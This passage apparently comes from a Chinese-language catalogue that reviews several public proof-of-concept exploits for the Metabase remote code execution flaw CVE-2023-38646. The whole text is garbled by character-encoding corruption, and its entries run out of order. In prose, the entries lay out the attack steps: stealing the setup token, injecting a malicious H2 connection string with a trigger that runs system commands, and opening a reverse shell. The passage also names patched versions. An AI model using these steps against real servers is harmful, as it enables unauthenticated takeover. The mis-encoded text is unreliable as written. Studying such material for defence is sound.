æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

